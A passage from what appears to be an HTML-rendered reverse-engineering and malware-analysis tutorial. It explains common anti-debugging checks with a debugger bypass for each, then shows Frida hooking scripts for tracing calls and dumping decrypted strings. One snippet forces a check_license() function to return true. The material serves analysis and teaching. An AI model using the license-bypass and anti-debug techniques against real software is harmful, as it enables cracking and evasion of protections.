<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># x64dbg: Set breakpoint on IsDebuggerPresent, modify return value</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bp IsDebuggerPresent</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># When hit: Set RAX = 0 (no debugger)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r rax </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><br></span></code></pre></div></div>
<p><strong>2. PEB BeingDebugged flag:</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">; Check PEB-&gt;BeingDebugged (offset 0x2 in PEB)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov eax, fs:[0x30]      ; PEB address (x86)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">movzx eax, byte ptr [eax+0x2]  ; BeingDebugged flag</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test eax, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jnz debugger_detected</span><br></span></code></pre></div></div>
<p><strong>Bypass:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># x64dbg: Find PEB address, set BeingDebugged to 0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># View → Memory Map → Find PEB</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Set byte at PEB+0x2 to 0x00</span><br></span></code></pre></div></div>
<p><strong>3. Timing checks:</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// Measure time between two points (debugger slows execution)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DWORD start </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">GetTickCount</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// ... some code ...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DWORD end </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">GetTickCount</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">end </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> start </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// Debugger detected (took too long)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p><strong>Bypass:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># x64dbg: Modify timing values or patch comparison</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Set breakpoint before comparison, modify end value:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">r eax </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">lt</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">start_value</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">gt</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># Make time difference = 0</span><br></span></code></pre></div></div>
<p><strong>4. RDTSC (Read Time-Stamp Counter):</strong></p>
<div class="language-nasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-nasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rdtsc                   ; Read CPU timestamp into EDX:EAX</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov ebx, eax            ; Save timestamp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">; ... some code ...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rdtsc                   ; Read timestamp again</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sub eax, ebx            ; Calculate difference</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cmp eax, 0x1000         ; Check if too slow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ja debugger_detected</span><br></span></code></pre></div></div>
<p><strong>Bypass:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Patch RDTSC or comparison</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># x64dbg: Assemble → Replace &quot;cmp eax, 0x1000&quot; with &quot;cmp eax, 0xFFFFFFFF&quot;</span><br></span></code></pre></div></div>
<p><strong>5. Exception-based anti-debugging:</strong></p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// Debugger handles exceptions differently</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">__try </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> x </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token number" style="color:#36acaa">0x00000000</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// Trigger exception</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">__except</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">EXCEPTION_EXECUTE_HANDLER</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">// No debugger (exception handled normally)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p><strong>Bypass:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># x64dbg: Set exception handling options</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Options → Preferences → Exceptions → Pass all exceptions to debugged program</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="dynamic-instrumentation-frida">Dynamic Instrumentation (Frida)<a href="#dynamic-instrumentation-frida" class="hash-link" aria-label="Direct link to Dynamic Instrumentation (Frida)" title="Direct link to Dynamic Instrumentation (Frida)" translate="no">​</a></h3>
<p><strong>Frida</strong> allows runtime modification without a debugger.</p>
<p><strong>Installing Frida:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Python:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pip </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> frida frida-tools</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Verify:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">frida </span><span class="token parameter variable" style="color:#36acaa">--version</span><br></span></code></pre></div></div>
<p><strong>Hooking functions:</strong></p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// Frida JavaScript: Hook MessageBoxA on Windows</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">// Save as hook.js</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">Interceptor</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">attach</span><span class="token punctuation" style="color:#393A34">(</span><span class="token maybe-class-name">Module</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">findExportByName</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;user32.dll&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;MessageBoxA&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function-variable function" style="color:#d73a49">onEnter</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">function</span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">args</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token console class-name">console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;[MessageBoxA] Called!&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token console class-name">console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;  hWnd: &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> args</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token console class-name">console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;  Text: &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token maybe-class-name">Memory</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">readUtf8String</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">args</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token console class-name">console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;  Title: &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token maybe-class-name">Memory</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">readUtf8String</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">args</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token console class-name">console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;  Type: &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> args</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic">// Modify arguments:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        args</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token maybe-class-name">Memory</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">allocUtf8String</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Hooked by Frida!&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function-variable function" style="color:#d73a49">onLeave</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">function</span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">retval</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token console class-name">console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;[MessageBoxA] Return value: &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> retval</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><strong>Running Frida script:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Attach to process by name:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">frida </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"> hook.js </span><span class="token parameter variable" style="color:#36acaa">-n</span><span class="token plain"> malware.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Attach to process by PID:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">frida </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"> hook.js </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1234</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Spawn new process:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">frida </span><span class="token parameter variable" style="color:#36acaa">-l</span><span class="token plain"> hook.js </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> malware.exe</span><br></span></code></pre></div></div>
<p><strong>Frida examples:</strong></p>
<p><strong>1. Bypass license check:</strong></p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// Hook check_license() function, force return TRUE</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> base </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token maybe-class-name">Module</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">findBaseAddress</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;malware.exe&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> check_license </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> base</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">add</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x1234</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// Offset of function</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">Interceptor</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">attach</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">check_license</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function-variable function" style="color:#d73a49">onLeave</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">function</span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">retval</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token console class-name">console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Original return value: &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> retval</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        retval</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">replace</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic">// Force return TRUE</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token console class-name">console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Modified to: 1 (license valid)&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><strong>2. Dump decrypted strings:</strong></p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// Hook decryption function, log decrypted output</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">Interceptor</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">attach</span><span class="token punctuation" style="color:#393A34">(</span><span class="token maybe-class-name">Module</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">findExportByName</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword null nil" style="color:#00009f">null</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;decrypt_string&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function-variable function" style="color:#d73a49">onLeave</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">function</span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">retval</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> decrypted </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token maybe-class-name">Memory</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">readUtf8String</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">retval</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token console class-name">console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">log</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Decrypted string: &quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> decrypted</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p><strong>3. Trace all function calls:</strong></p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">// Trace all calls to functions in malware.exe</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> moduleName </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;malware.exe&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">var</span><span class="token plain"> module </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token maybe-class-name">Process</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">getModuleByName</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">moduleName</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">Module</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">enumerateExports</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">moduleName</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" 